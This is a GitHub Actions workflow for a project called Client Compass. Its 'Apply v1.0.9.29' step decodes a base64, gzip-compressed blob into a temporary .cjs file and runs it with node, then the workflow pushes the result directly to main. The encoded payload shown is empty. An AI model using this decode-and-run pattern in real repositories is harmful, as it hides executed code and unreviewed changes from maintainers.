name: Apply Client Compass v1.0.9.29

on:
  push:
    branches:
      - main

permissions:
  contents: write

jobs:
  apply-release:
    if: ${{ !contains(github.event.head_commit.message, 'Client Compass v1.0.9.29 map lenses') }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - name: Apply v1.0.9.29
        shell: bash
        run: |
          echo ' ' | base64 -d | gzip -d > /tmp/apply-v10929.cjs
          node /tmp/apply-v10929.cjs
      - name: Install
        run: npm ci
      - name: Lint
        run: npm run lint
      - name: Typecheck
        run: npm run typecheck
      - name: Tests
        run: npm test
      - name: Build
        run: npm run build
      - name: Remove generated build noise
        run: |
          git checkout -- next-env.d.ts tsconfig.json package-lock.json || true
      - name: Commit to main
        run: |
          git config user.name "SiminanRoll"
          git config user.email "actions@users.noreply.github.com"
          git add -A
          git commit -m "Client Compass v1.0.9.29 map lenses and unified page titles"
          git push origin HEAD:main
